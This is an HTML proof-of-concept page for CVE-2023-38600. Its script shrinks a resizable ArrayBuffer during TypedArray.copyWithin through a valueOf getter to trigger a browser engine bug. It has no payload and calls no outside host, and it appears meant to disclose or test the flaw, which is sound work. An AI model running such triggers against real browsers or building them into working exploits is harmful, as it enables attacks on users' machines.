<!DOCTYPE html>
<html>
<head>
    <title>CVE-2023-38600 PoC</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting CVE-2023-38600 exploit...");

            // Create a resizable ArrayBuffer
            const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
            const view = new Uint8Array(buffer);

            // Resize the buffer during copyWithin via a getter
            const evil = {
                valueOf: () => {
                    log("Resizing buffer mid-copyWithin!");
                    buffer.resize(8); // Shrink buffer during operation
                    return 0;
                }
            };

            try {
                // This will trigger the bug!
                view.copyWithin(0, evil, 16);
                log("Exploit finished (no crash or exception).");
            } catch (e) {
                log("Exception caught: " + e.message);
            }

            log("Exploit done.");
        };
    </script>
</head>
<body>
    <h2>CVE-2023-38600 - TypedArray.copyWithin Integer Underflow</h2>
    <p>Check console for results.</p>
</body>
</html>
